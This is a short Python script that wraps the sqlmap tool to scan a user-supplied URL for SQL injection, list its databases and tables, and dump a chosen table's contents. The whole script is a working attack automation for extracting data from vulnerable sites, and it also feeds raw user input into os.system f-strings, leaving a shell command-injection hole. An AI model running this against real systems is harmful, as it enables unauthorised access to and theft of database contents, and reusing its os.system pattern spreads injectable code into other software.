import os

target = input("Enter the URL to test: ")

# Use SQLMap to scan the URL for SQL injection vulnerabilities
os.system(f"sqlmap -u {target} --batch --dbs --level=2")

# Use SQLMap to dump the contents of a database
database = input("Enter the name of the database to dump: ")
os.system(f"sqlmap -u {target} -D {database} --tables --level=2")
table = input("Enter the name of the table to dump: ")
os.system(f"sqlmap -u {target} -D {database} -T {table} --dump --level=2")
